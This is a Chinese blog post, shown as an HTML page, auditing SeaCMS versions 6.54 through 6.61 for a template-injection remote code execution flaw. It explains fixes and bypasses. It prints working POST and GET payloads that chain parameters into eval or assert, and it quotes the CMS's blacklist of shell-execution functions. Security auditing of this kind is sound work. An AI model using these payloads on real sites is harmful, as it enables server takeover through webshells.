@@ -1,0 +1,734 @@
+<!DOCTYPE html>
+<html>
+<head>
+    <meta http-equiv="Content-Language" content="zh-cn">
+    <meta charset="utf-8">
+    
+    
+    
+    <title>代码审计--seacms命令执行漏洞（6.45后续版本） | Somnus&#39;s blog</title>
+    <meta name="viewport" content="width=device-width,minimum-scale=1.0,maximum-scale=1.0,user-scalable=no">
+    
+    <meta name="theme-color" content="#77AAFF">
+    
+    
+    <meta name="keywords" content="代码审计">
+    
+    
+
+    
+
+    <!-- Baidu Push -->
+<script>
+	(function(){
+		var bp = document.createElement('script');
+		var curProtocol = window.location.protocol.split(':')[0];
+		if (curProtocol === 'https') {
+			bp.src = 'https://zz.bdstatic.com/linksubmit/push.js';
+		}
+		else {
+			bp.src = 'http://push.zhanzhang.baidu.com/push.js';
+		}
+		var s = document.getElementsByTagName("script")[0];
+		s.parentNode.insertBefore(bp, s);
+	})();
+
+	var _hmt = _hmt || [];
+</script>
+
+
+
+    
+    <meta name="description" content="代码审计">
+<meta name="keywords" content="代码审计">
+<meta property="og:type" content="article">
+<meta property="og:title" content="代码审计--seacms命令执行漏洞（6.45后续版本）">
+<meta property="og:url" content="https://Foxgrin.github.io/posts/10257/index.html">
+<meta property="og:site_name" content="Somnus&#39;s blog">
+<meta property="og:description" content="代码审计">
+<meta property="og:locale" content="zh-Hans">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/4.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/5.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/6.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/7.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/8.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/9.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/10.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/11.png">
+<meta property="og:image" content="https://foxgrin.github.io/img/seacms/12.png">
+<meta property="og:updated_time" content="2019-04-06T02:49:11.598Z">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:title" content="代码审计--seacms命令执行漏洞（6.45后续版本）">
+<meta name="twitter:description" content="代码审计">
+<meta name="twitter:image" content="https://foxgrin.github.io/img/seacms/4.png">
+    
+        <link rel="alternate" type="application/atom+xml" title="Somnus&#39;s blog" href="/atom.xml">
+    
+    <link rel="shortcut icon" href="/img/favicon.ico">
+    <link id="style" rel="stylesheet" href="/css/style.css?v=3.0">
+    <script>window.lazyScripts=[]</script>
+
+    <!-- custom head -->
+    
+            
+</head>
+
+<body>
+    <div id="loading" class="active"></div>
+    <aside id="menu"  class="hide" >
+  <div class="inner flex-row-vertical">
+    <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="menu-off">
+        <i class="icon icon-lg icon-close"></i>
+    </a>
+    <div class="brand-wrap" >
+      <div class="brand">
+        <a href="/" class="avatar waves-effect waves-circle waves-light">
+          <img src="/img/touxiang/1.jpg" alt="avatar">
+        </a>
+        <hgroup class="introduce">
+          <h5 class="nickname" id="name">Somnus</h5>
+          
+            <div id="yiyanmotto" class="motto">&nbsp;</div>
+          
+        </hgroup>
+      </div>
+    </div>
+    <div class="scroll-wrap flex-col">
+      <ul class="nav">
+        
+              <li class="waves-block waves-effect">
+                  <a href="/"  >
+                    <i class="icon icon-lg icon-home"></i>
+                    <span>主 页</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/archives"  >
+                    <i class="icon icon-lg icon-archives"></i>
+                    <span>归 档</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/categories"  >
+                    <i class="icon icon-lg icon-th-list"></i>
+                    <span>分 类</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/tags"  >
+                    <i class="icon icon-lg icon-tags"></i>
+                    <span>标 签</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+              <li class="waves-block waves-effect">
+                  <a href="/about"  >
+                    <i class="icon icon-lg icon-smile-o"></i>
+                    <span>关 于</span><i class="icon icon-lg icon-caret-left"></i>
+                  </a>
+              </li>
+            
+      <div class="nav2">
+          
+              <a class="nav2item" data-title="Email" href="mailto:823263808@qq.com" target="_parent"title="Email" >
+                <i class="icon icon-lg icon-envelope-o envelope-o"></i>
+              </a>
+          
+              <a class="nav2item" data-title="Github" href="https://github.com/Foxgrin" target="_blank"title="Github" >
+                <i class="icon icon-lg icon-github github"></i>
+              </a>
+          
+              <a class="nav2item" data-title="微博" href="https://weibo.com/u/6018528806" target="_blank"title="微博" >
+                <i class="icon icon-lg icon-weibo weibo"></i>
+              </a>
+          
+
+            </div>
+        
+      </ul>
+        
+    </div>
+  </div>
+ 
+</aside>
+
+
+    <main id="main">
+        <header class="top-header" id="header">
+    <div class="flex-row">
+        <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light on" id="menu-toggle">
+          <i class="icon icon-lg icon-navicon"></i>
+        </a>
+        <div class="flex-col header-title ellipsis">代码审计--seacms命令执行漏洞（6.45后续版本）</div>
+        
+        <div class="search-wrap" id="search-wrap">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="back">
+                <i class="icon icon-lg icon-chevron-left"></i>
+            </a>
+            <input type="text" id="key" class="search-input" autocomplete="off" placeholder="Search">
+            <a href="javascript:;" class="header-icon waves-effect waves-circle waves-light" id="search">
+                <i class="icon icon-lg icon-search"></i>
+            </a>
+        </div>
+        
+        <a href="../../atom.xml" target="_blank" class="header-icon waves-effect waves-circle waves-light" id="Rss">
+            <i class="icon icon-lg icon-rss"></i>
+        </a>
+    </div>
+</header>
+<header class="content-header post-header">
+    
+    
+    <div class="container fade-scale">
+        <div id="myheader">
+            <h1 class="title">
+                
+            </h1>
+            <h5 class="subtitle">
+                
+                
+            </h5>
+        </div>
+    </div>
+
+</header>
+
+
+<div class="container body-wrap">
+    
+    <aside class="post-widget">
+        <nav class="post-toc-wrap" id="post-toc">
+            <h4>TOC</h4>
+            <ol class="post-toc"><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#seacms-6-54"><span class="post-toc-number">1.</span> <span class="post-toc-text">seacms 6.54</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#seacms-6-55"><span class="post-toc-number">2.</span> <span class="post-toc-text">seacms 6.55</span></a></li><li class="post-toc-item post-toc-level-2"><a class="post-toc-link" href="#seacms-6-61"><span class="post-toc-number">3.</span> <span class="post-toc-text">seacms 6.61</span></a></li></ol>
+        </nav>
+    </aside>
+   
+<article id="post-代码审计-seacms命令执行漏洞（6.45后续版本）"
+  class="post-article article-type-post fade" itemprop="blogPost">
+
+    <div class="post-card">
+        <h1 class="post-card-title">代码审计--seacms命令执行漏洞（6.45后续版本）</h1>
+        <div class="post-meta">
+            <i class="icon icon-lg icon-calendar-o"></i>
+            发表于
+            <time class="post-time" title="2019-04-03 16:15:00" datetime="2019-04-03T08:15:00.000Z"  itemprop="datePublished">2019-04-03</time>
+
+            <br id="mybreak"/>
+            
+	<i class="icon icon-lg icon-folder-o"></i>
+	分类：<ul class="article-category-list"><li class="article-category-list-item"><a class="article-category-list-link" href="/categories/代码审计/">代码审计</a></li></ul>
+
+
+            <i>·</i>
+            
+<span id="busuanzi_container_page_pv" title="文章总阅读量" style='display:none'>
+    <i class="icon icon-eye icon-pr"></i><span id="busuanzi_value_page_pv"></span>次浏览
+</span>
+
+
+        </div>
+        <div class="post-count-custom">
+            <i class="icon icon-lg icon-comment-o"></i>
+            阅读本文可能花费您&nbsp;<span class="post-count">10</span>&nbsp;分钟
+        </div>
+        <div class="post-content" id="post-content" itemprop="postContent">
+            <p>继续跟踪海洋cms 6.45后续版本是否修复命令执行漏洞<a id="more"></a></p>
+<h2 id="seacms-6-54"><a href="#seacms-6-54" class="headerlink" title="seacms 6.54"></a>seacms 6.54</h2><p>参考链接：<a href="https://www.freebuf.com/vuls/150042.html" target="_blank" rel="noopener">漏洞预警 | 海洋CMS（SEACMS）0day漏洞预警</a></p>
+<p>在之前的6.45版本中，由于服务器未对参数<code>$order</code>进行合理的过滤：<code>$order = !empty($order)?$order:time;</code>,导致<code>$order</code>内容替换模板<code>$content</code>内容：<code>$content = str_replace(&quot;{searchpage:ordername}&quot;,$order,$content);</code>，之后<code>$content</code>内容传入<code>parseIf</code>函数，通过正则匹配规则<code>{if:(.*?)}(.*?){end if}</code>匹配后的内容传入命令执行函数<code>@eval(&quot;if(&quot;.$strIf.&quot;) { \$ifFlag=true;} else{ \$ifFlag=false;}&quot;);</code>，最终导致了getshell</p>
+<p>这次我继续跟踪6.54版本，首先看一下它的更新日志</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line">更新日期：2017年8月7日 v6.54</span><br><span class="line">修复：紧急修复2处高危安全漏洞</span><br><span class="line"></span><br><span class="line">更新日期：2017年8月6日 v6.53</span><br><span class="line">新增：微信公众平台模块</span><br><span class="line">优化：采集逻辑</span><br><span class="line">修复：部分文字描述错误</span><br><span class="line">更新日期：2017年2月18日 v6.46</span><br><span class="line">修复：两处安全问题</span><br><span class="line"></span><br><span class="line">更新日期：2017年2月6日 v6.45</span><br><span class="line">修复：一处安全问题</span><br></pre></td></tr></table></figure>
+<p>审计后发现，与6.45版本不同的是，6.54版本中<code>/search.php</code>的第65行对参数<code>$order</code>进行了白名单的过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$order = ($order == <span class="string">"commend"</span> || $order == <span class="string">"time"</span> || $order == <span class="string">"hit"</span>) ? $order : <span class="string">""</span>;</span><br></pre></td></tr></table></figure>
+<p>看似成功修复了6.45版本的<code>order</code>参数导致的命令执行getshell漏洞，但是本质上还是未对该漏洞进行修复，<code>order</code>参数只是6.45版本中最好利用的命令注入点，并不代表其他参数不存在注入点</p>
+<p>下面我们再重新梳理一遍该cms对用户输入的过滤点，首先是全局文件<code>/include/common.php</code>的转义处理</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>(<span class="keyword">Array</span>(<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>) <span class="keyword">as</span> $_request)</span><br><span class="line">&#123;</span><br><span class="line">	<span class="keyword">foreach</span>($$_request <span class="keyword">as</span> $_k =&gt; $_v) $&#123;$_k&#125; = _RunMagicQuotes($_v);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<p>第二个是在<code>/search.php</code>本文件下对用户输入参数的过滤，包括<code>RemoveXSS</code>函数过滤和最多20字符的限制</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">$jq = RemoveXSS(stripslashes($jq));</span><br><span class="line">$jq = addslashes(cn_substr($jq,<span class="number">20</span>));</span><br><span class="line"></span><br><span class="line">$area = RemoveXSS(stripslashes($area));</span><br><span class="line">$area = addslashes(cn_substr($area,<span class="number">20</span>));</span><br><span class="line">...</span><br></pre></td></tr></table></figure>
+<p>虽然一个参数无法绕过这些过滤，但是我们知道模板内容替换的参数不止一个，所以，可以用多个参数组合替换的方法进行getshell</p>
+<p>下面贴上参考文章抓取的攻击payload</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">POST</span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:e&#123;searchpage:area&#125;&#125;&amp;area=v&#123;searchpage:letter&#125;&amp;letter=al&#123;searchpage:lang&#125;&amp;yuyan=(join&#123;searchpage:jq&#125;&amp;jq=($_P&#123;searchpage:ver&#125;&amp;&amp;ver=OST[9]))&amp;9[]=ph&amp;9[]=pinfo();</span><br></pre></td></tr></table></figure>
+<p>可以看到，注入点已经不止一个，也不是之前的<code>order</code></p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">echoSearchPage</span><span class="params">()</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">......</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:page&#125;"</span>,$page,$content);</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;seacms:searchword&#125;"</span>,$searchword,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;seacms:searchnum&#125;"</span>,$TotalResult,$content);</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;searchpage:ordername&#125;"</span>,$order,$content);</span><br><span class="line">......</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:year&#125;"</span>,$year,$content);</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;searchpage:area&#125;"</span>,$area,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:letter&#125;"</span>,$letter,$content);</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;searchpage:lang&#125;"</span>,$yuyan,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:jq&#125;"</span>,$jq,$content);</span><br><span class="line">    ......</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;searchpage:state&#125;"</span>,$state2,$content);</span><br><span class="line">    $content = str_replace(<span class="string">"&#123;searchpage:money&#125;"</span>,$money2,$content);</span><br><span class="line">    	$content = str_replace(<span class="string">"&#123;searchpage:ver&#125;"</span>,$ver,$content);</span><br><span class="line">......</span><br><span class="line">    $content=$mainClassObj-&gt;parseIf($content);</span><br></pre></td></tr></table></figure>
+<p>以上是<code>/search.php</code>文件中对模板内容<code>{searchpage:}</code>替换payload所用参数的顺序，根据上面的payload，最终替换的<code>$content</code>内容包含了</p>
+<p><code>{if:eval(join($_POST[9]))}</code></p>
+<p>然后传入<code>parseIf</code>函数中的命令执行函数<code>eval</code>，最终执行<code>eval(&quot;if(eval(join($_POST[9])))&quot;)</code>，下面是最终执行的效果图</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/4.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>虽然是通过多个参数拼接起来，但是最关键的注入点还是在于参数<code>$searchword</code>，所以，根据参考文章中的修复方法是过滤参数<code>$searchword</code>中的<code>{searchpage:</code>内容</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($searchword,<span class="string">'&#123;searchpage:'</span>)) <span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>
+<h2 id="seacms-6-55"><a href="#seacms-6-55" class="headerlink" title="seacms 6.55"></a>seacms 6.55</h2><p>拿到6.55版本源码，直接按6.54的payload测试，发现行不通，看来有进行一些修复，审计完，对比6.54，一方面还是对参数<code>$order</code>进行了一个白名单过滤，位置在<code>/search.php</code>第66-67行</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$orderarr=<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'idasc'</span>,<span class="string">'time'</span>,<span class="string">'timeasc'</span>,<span class="string">'hit'</span>,<span class="string">'hitasc'</span>,<span class="string">'commend'</span>,<span class="string">'commendasc'</span>,<span class="string">'score'</span>,<span class="string">'scoreasc'</span>);</span><br><span class="line"><span class="keyword">if</span>(!(in_array($order,$orderarr)))&#123;$order=<span class="string">'time'</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>当然，在6.54我们就已经分析过，造成漏洞的注入点不仅仅只有参数<code>$order</code>一个，还可以通过各个参数拼接</p>
+<p>另外，在<code>parseIf</code>加入了对<code>$content</code>匹配内容结果数组<code>$iar</code>也进行了黑名单过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($iar <span class="keyword">as</span> $v)&#123;</span><br><span class="line">            $iarok[] = str_replace(<span class="keyword">array</span>(<span class="string">'unlink'</span>,<span class="string">'opendir'</span>,<span class="string">'mysqli_'</span>,<span class="string">'mysql_'</span>,<span class="string">'socket_'</span>,<span class="string">'curl_'</span>,<span class="string">'base64_'</span>,<span class="string">'putenv'</span>,<span class="string">'popen('</span>,<span class="string">'phpinfo'</span>,<span class="string">'pfsockopen'</span>,<span class="string">'proc_'</span>,<span class="string">'preg_'</span>,<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'_SESSION'</span>,<span class="string">'eval('</span>,<span class="string">'file_'</span>,<span class="string">'passthru('</span>,<span class="string">'exec('</span>,<span class="string">'system('</span>,<span class="string">'shell_'</span>), <span class="string">'@.@'</span>, $v);</span><br><span class="line">        &#125;</span><br><span class="line">        $iar = $iarok;</span><br></pre></td></tr></table></figure>
+<p>可以看到，我们之前payload的<code>eval,_POST</code>都在黑名单数组中，最后被替换成了<code>@.@</code>，所以原来payload肯定是行不通的，那么，是否真的解决了安全问题呢，其实并没有，我们仔细看黑名单内容，就能发现，其实这里只过滤了一个php执行函数<code>eval</code>，<code>assert</code>函数并没有被过滤。另外，虽然<code>_GET,_POST,_COOKIE,_REQUEST</code>被过滤，但是<code>_SERVER</code>没有被过滤。所以，过滤并不完整，还是可以通过拼接参数的方法进行getshell，只不过换一个函数和全局变量罢了，payload如下：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">POST /seacms6.55/search.php?phpinfo();</span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">searchtype=5&amp;searchword=&#123;if&#123;searchpage:year&#125;&amp;year=:a&#123;searchpage:area&#125;&#125;&amp;area=s&#123;searchpage:letter&amp;letter=ser&#123;searchpage:lang&#125;&amp;yuyan=t(&#123;searchpage:jq&#125;&amp;jq=$_S&#123;searchpage:ver&#125;&#125;&amp;&amp;ver=ERVER[QUERY_STRING])</span><br></pre></td></tr></table></figure>
+<p>最后的执行效果：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/5.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>所以，修复方法也还是需要针对参数<code>searchword</code>的<code>{searchpage:</code>内容</p>
+<h2 id="seacms-6-61"><a href="#seacms-6-61" class="headerlink" title="seacms 6.61"></a>seacms 6.61</h2><p>6.61版本同样对参数<code>$order</code>进行了白名单过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$orderarr=<span class="keyword">array</span>(<span class="string">'id'</span>,<span class="string">'idasc'</span>,<span class="string">'time'</span>,<span class="string">'timeasc'</span>,<span class="string">'hit'</span>,<span class="string">'hitasc'</span>,<span class="string">'commend'</span>,<span class="string">'commendasc'</span>,<span class="string">'score'</span>,<span class="string">'scoreasc'</span>);</span><br><span class="line">    <span class="keyword">if</span>(!(in_array($order,$orderarr)))&#123;$order=<span class="string">'time'</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>并且同样在<code>parseIf</code>函数中对<code>$iar</code>匹配数组进行了黑名单过滤</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">foreach</span>($iar <span class="keyword">as</span> $v)&#123;</span><br><span class="line">            $iarok[] = str_ireplace(<span class="keyword">array</span>(<span class="string">'unlink'</span>,<span class="string">'opendir'</span>,<span class="string">'mysqli_'</span>,<span class="string">'mysql_'</span>,<span class="string">'socket_'</span>,<span class="string">'curl_'</span>,<span class="string">'base64_'</span>,<span class="string">'putenv'</span>,<span class="string">'popen('</span>,<span class="string">'phpinfo'</span>,<span class="string">'pfsockopen'</span>,<span class="string">'proc_'</span>,<span class="string">'preg_'</span>,<span class="string">'_GET'</span>,<span class="string">'_POST'</span>,<span class="string">'_COOKIE'</span>,<span class="string">'_REQUEST'</span>,<span class="string">'_SESSION'</span>,<span class="string">'_SERVER'</span>,<span class="string">'assert'</span>,<span class="string">'eval('</span>,<span class="string">'file_'</span>,<span class="string">'passthru('</span>,<span class="string">'exec('</span>,<span class="string">'system('</span>,<span class="string">'shell_'</span>), <span class="string">'@.@'</span>, $v);</span><br><span class="line">        &#125;</span><br><span class="line">        $iar = $iarok;</span><br></pre></td></tr></table></figure>
+<p>我们可以发现这个版本的黑名单相对于6.55版本添加过滤了关键字<code>assert</code>和<code>_SERVER</code></p>
+<p>但是，在<code>search.php</code>中，又新添加了针对于6.54和6.55漏洞提出者提议的过滤：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(strpos($searchword,<span class="string">'&#123;searchpage:'</span>)) &#123;ShowMsg(<span class="string">'请勿输入危险字符！'</span>,<span class="string">'index.php'</span>,<span class="string">'0'</span>,$cfg_search_time*<span class="number">1000</span>);<span class="keyword">exit</span>;&#125;</span><br></pre></td></tr></table></figure>
+<p>即对参数<code>$searchword</code>的内容<code>{searchpage:</code>进行了过滤</p>
+<p>这次的过滤可谓是比较全面的了，不仅仅是参数<code>$order</code>，也过滤了参数拼接，看似已经很安全，但是还是有大佬挖出来了，emmm再次不得不感叹有输入的地方就可能存在漏洞，百密一疏都可能导致漏洞的发生</p>
+<p>贴上参考链接：<a href="https://www.anquanke.com/post/id/152764" target="_blank" rel="noopener">CVE-2018-14421——Seacms后台getshell分析</a></p>
+<p>参考链接给出的漏洞处在后台管理-&gt;添加影片-&gt;图片地址</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125;</span><br></pre></td></tr></table></figure>
+<p>之后访问<code>/detail/?1.html&amp;a=assert&amp;b=phpinfo();</code>，<code>/search.php?searchtype=5&amp;a=assert&amp;b=phpinfo();</code>都可以成功getshell</p>
+<p>先验证一下</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/6.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>添加后访问</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/7.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/8.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>都成功，说明payload有效，我们观察一下payload，其实挺像我们在6.45版本中<code>$order</code>参数的注入内容，所以猜测同样是替换模板进行命令执行的，但这都是猜测，要真正弄懂还是要一步步跟踪到漏洞根源</p>
+<p>首先我们先抓包获取我们注入payload的参数名</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/9.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>参数名为<code>v_pic</code>，并且接收该参数的文件名：<code>/backend/admin_video.php?action=save&amp;acttype=add</code>也知道了，那么接下来只需要在该文件中搜索关键字<code>v_pic</code>即可</p>
+<p>在111行：<code>$v_pic = cn_substrR($v_pic,255);</code>获取该参数值，<code>cn_substrR</code>只是一个截取255长度的函数，不需要关注</p>
+<p>之后在117行处：</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/10.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>我们可发现参数<code>$v_pic</code>拼接至变量<code>$insertSql</code>后添加到数据库中，到这里数据就添加成功了，也就是说，后台对我们输入的内容除了截取255长度的处理外无其他处理，此时，payload已经入库</p>
+<p>之后我们在后台管理-&gt;管理影片</p>
+<figure class="image-bubble">
+                <div class="img-lightbox">
+                    <div class="overlay"></div>
+                    <img src="/img/seacms/11.png" alt="" title="">
+                </div>
+                <div class="image-caption"></div>
+            </figure>
+<p>可以发现，我们添加的影片内容，在<code>/detail/?1.html</code>下可以访问，那么老样子，直接搜索关键字<code>v_pic</code>，在101行中搜索到：<code>$v_pic=$row[&#39;v_pic&#39;];</code>，跟踪变量<code>$row</code>，在23行中搜索到：<code>$row=$dsql-&gt;GetOne(&quot;Select d.*,p.body as v_playdata,p.body1 as v_downdata,c.body as v_content From</code>sea_data<code>d left join</code>sea_playdata<code>p on p.v_id=d.v_id left join</code>sea_content<code>c on c.v_id=d.v_id where d.v_id=&#39;$vId&#39;&quot;)</code></p>
+<p>即从数据库中取出我们之前添加的<code>$v_pic</code>，之后在102行中：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(!<span class="keyword">empty</span>($v_pic))&#123;</span><br><span class="line">		<span class="keyword">if</span>(strpos(<span class="string">' '</span>.$v_pic,<span class="string">'://'</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">		$content=str_replace(<span class="string">"&#123;playpage:pic&#125;"</span>,$v_pic,$content);</span><br><span class="line">		&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		$content=str_replace(<span class="string">"&#123;playpage:pic&#125;"</span>,<span class="string">'/'</span>.$GLOBALS[<span class="string">'cfg_cmspath'</span>].ltrim($v_pic,<span class="string">'/'</span>),$content);</span><br><span class="line">		&#125;</span><br></pre></td></tr></table></figure>
+<p>进行熟悉的模板内容替换，果然如之前猜测的一样，再搜索关键字<code>parseIf</code>，在161行中搜索到：<code>$content=$mainClassObj-&gt;parseIf($content);</code></p>
+<p>接下来，只需要找到模板文件，就能弄清楚替换后内容，模板文件为：<code>/templets/default/html/content.html</code>，搜索关键字<code>{playpage:pic}</code>，在第22行中搜索到：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;playpage:pic&#125;)  no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>所以，我们替换的内容即为：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;a class=&quot;videopic&quot; href=&quot;&#123;playpage:playlink&#125;&quot; title=&quot;&#123;playpage:name&#125;&quot; style=&quot;background: url(&#123;if:1)$GLOBALS[&apos;_G&apos;.&apos;ET&apos;][a]($GLOBALS[&apos;_G&apos;.&apos;ET&apos;][b]);//&#125;&#123;end if&#125;)  no-repeat; background-position:50% 50%; background-size: cover;&quot;&gt;</span><br></pre></td></tr></table></figure>
+<p>替换后进入<code>parseIf</code>函数匹配到的内容即为：<code>{if:1)$GLOBALS[&#39;_G&#39;.&#39;ET&#39;][a]($GLOBALS[&#39;_G&#39;.&#39;ET&#39;][b]);//}{end if}</code>，进入命令执行的内容为：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">@<span class="keyword">eval</span>(<span class="string">"if(1)$GLOBALS['_G'.'ET'][a]($GLOBALS['_G'.'ET'][b]);//)&#123; \$ifFlag=true;&#125; else&#123; \$ifFlag=false;&#125;"</span>);</span><br></pre></td></tr></table></figure>
